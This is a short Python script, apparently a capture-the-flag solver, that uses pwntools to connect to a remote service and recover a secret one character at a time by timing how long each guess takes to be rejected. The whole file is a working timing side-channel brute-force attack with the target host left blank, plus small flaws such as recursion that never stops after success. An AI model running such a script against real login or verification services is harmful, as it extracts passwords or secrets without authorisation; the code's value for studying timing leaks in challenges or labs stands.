#!/usr/bin/env python3

"""
For a program that takes longer to check wrong answers than right answers.

Think of it like traversing a tree where each node has 26 branches, where the fastest route is correct.

Can easily be changed for slowest instead.
"""


import time
from pwn import *
import string

target = ""
port = 1234

p = remote(target, port)

print(p.recvline())

def func(current):
    # Iterate all printable characters, bruteforcing
    # The current character
    cool_name = {}

    for char in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!?#$%&'()*+,-./:;<=>?@[\]^_`{|}~:":
        current_flag = current + char
        start = time.time()
        print(current_flag)
        p.sendline(current_flag)
        data = p.recvline()
        end = time.time()
        #print(end - start)

        cool_name[char] = (end - start)

        if b"got it" in data:
            print(current_flag)
            print("Ending!")

    #print(cool_name)

    new = min(cool_name, key=cool_name.get)
    print(new)

    #print(current + new)

    cool_name = {}
    func(current + new)

# Initial call to the recursive function
func("")
